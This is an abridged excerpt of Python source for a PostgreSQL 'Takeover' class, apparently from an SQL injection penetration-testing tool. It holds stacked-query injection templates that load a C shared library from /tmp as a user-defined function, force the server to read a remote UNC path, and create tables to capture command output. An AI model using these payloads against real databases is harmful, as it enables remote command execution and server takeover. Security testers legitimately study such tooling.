...
class Takeover(GenericTakeover):
    def udfSetRemotePath(self):
        ...
        # On Linux
            ...
            self.udfRemoteFile = "/tmp/%s.%s" % (
                self.udfSharedLibName,
                self.udfSharedLibExt,
            )
    ...
    def udfCreateFromSharedLib(self, udf, inpRet):
        if udf in self.udfToCreate:
            ...
            inject.goStacked(
                "CREATE OR REPLACE FUNCTION %s(%s) RETURNS %s AS '%s', '%s' LANGUAGE C"
    ...
    def uncPathRequest(self):
        ...
        inject.goStacked(
            "COPY %s(%s) FROM '%s'" % (self.fileTblName, self.tblField, self.uncPath),
            silent=True,
        )
    ...
    def copyExecCmd(self, cmd):
        ...
        if isStackingAvailable():
            ...
            self._forgedCmd += "CREATE TABLE %s(%s text);" % (
                self.cmdTblName,
                self.tblField,
            )
